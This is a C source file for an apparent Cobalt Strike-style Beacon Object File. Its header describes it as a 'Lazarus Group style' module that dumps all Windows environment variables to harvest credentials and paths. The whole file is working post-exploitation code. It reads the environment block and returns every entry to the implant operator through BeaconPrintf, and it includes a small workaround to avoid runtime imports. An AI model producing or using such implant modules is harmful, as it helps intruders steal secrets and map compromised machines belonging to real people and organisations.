/*
 * env.c - Full environment variables dump
 * Lazarus Group style - dump everything for creds/paths
 */
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI LPSTR WINAPI KERNEL32$GetEnvironmentStrings(void);
DECLSPEC_IMPORT WINBASEAPI BOOL  WINAPI KERNEL32$FreeEnvironmentStringsA(LPSTR);

/* Manual strlen to avoid CRT import issues in BOF.
 * volatile prevents compiler from optimizing this back to strlen(). */
static int my_strlen(const char* s) {
    volatile int len = 0;
    while (s[len]) len++;
    return (int)len;
}

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    LPSTR envBlock = KERNEL32$GetEnvironmentStrings();
    if (!envBlock) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get environment strings");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "=== Environment Variables ===");

    LPSTR ptr = envBlock;
    int count = 0;
    while (*ptr != '\0') {
        BeaconPrintf(CALLBACK_OUTPUT, "%s", ptr);
        ptr += my_strlen(ptr) + 1;
        count++;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Total: %d variables", count);
    KERNEL32$FreeEnvironmentStringsA(envBlock);
}
